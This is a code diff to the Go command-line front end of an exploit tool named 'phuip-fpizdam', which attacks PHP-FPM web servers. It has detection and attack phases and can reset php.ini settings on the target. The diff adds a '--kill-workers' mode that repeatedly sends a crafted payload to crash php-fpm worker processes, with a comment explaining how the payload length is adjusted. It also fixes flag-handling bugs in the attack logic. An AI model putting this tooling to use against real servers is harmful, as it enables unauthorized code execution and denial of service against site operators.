@@ -13,6 +13,8 @@ func main() {
 		setting      string
 		skipDetect   bool
 		skipAttack   bool
+		killWorkers  bool
+		killCount    int
 		resetSetting bool
 		resetRetries int
 		onlyQSL      bool
@@ -20,7 +22,7 @@ func main() {
 	)
 
 	var cmd = &cobra.Command{
-		Use:  "phuip-fpizdap [url]",
+		Use:  "phuip-fpizdam [url]",
 		Args: cobra.ExactArgs(1),
 		Run: func(cmd *cobra.Command, args []string) {
 			url := args[0]
@@ -55,6 +57,21 @@ func main() {
 				log.Fatal("--setting requires --reset-setting")
 			}
 
+			if killWorkers {
+				if params.QueryStringLength == 0 {
+					log.Fatal("QSL value is required for killing workers")
+				}
+				// The breaking payload is 4 bytes shorter than usual (34), so we have
+				// (Δ|SCRIPT_FILENAME| + Δ|REQUEST_URI| + Δ|DOCUMENT_URI|)/2 = 6.
+				// This probably won't work in some configurations.
+				params.QueryStringLength += 6
+				if err := KillWorkers(requester, params, killCount); err != nil {
+					log.Fatalf("KillWorkers() returned error: %v", err)
+				}
+				log.Printf("all done")
+				return
+			}
+
 			if skipDetect {
 				if !params.Complete() {
 					log.Fatal("Got --skip-detect and attack params are incomplete, don't know what to do")
@@ -78,7 +95,7 @@ func main() {
 				log.Printf("Detect() returned attack params: %s <-- REMEMBER THIS", params)
 			}
 
-			if skipAttack {
+			if skipAttack || onlyQSL {
 				log.Print("Attack phase is disabled, so that's it")
 				return
 			}
@@ -93,11 +110,13 @@ func main() {
 	cmd.Flags().IntVar(&params.QueryStringLength, "qsl", 0, "qsl hint")
 	cmd.Flags().IntVar(&params.PisosLength, "pisos", 0, "pisos hint")
 	cmd.Flags().BoolVar(&skipDetect, "skip-detect", false, "skip detection phase")
-	cmd.Flags().BoolVar(&skipDetect, "skip-attack", false, "skip attack phase")
+	cmd.Flags().BoolVar(&skipAttack, "skip-attack", false, "skip attack phase")
 	cmd.Flags().BoolVar(&onlyQSL, "only-qsl", false, "stop after QSL detection, use this if you just want to check if the server is vulnerable")
 	cmd.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")
-	cmd.Flags().IntVar(&resetRetries, "reset-retries", resetRetries, "how many retries to do for --reset-setting, -1 means 2**32")
+	cmd.Flags().IntVar(&resetRetries, "reset-retries", SettingEnableRetries, "how many retries to do for --reset-setting, -1 means 2**32")
 	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")
+	cmd.Flags().BoolVar(&killWorkers, "kill-workers", false, "just kill php-fpm workers (requires only QSL)")
+	cmd.Flags().IntVar(&killCount, "kill-count", SettingEnableRetries, "how many times to send the worker killing payload")
 
 	if err := cmd.Execute(); err != nil {
 		log.Fatal(err)
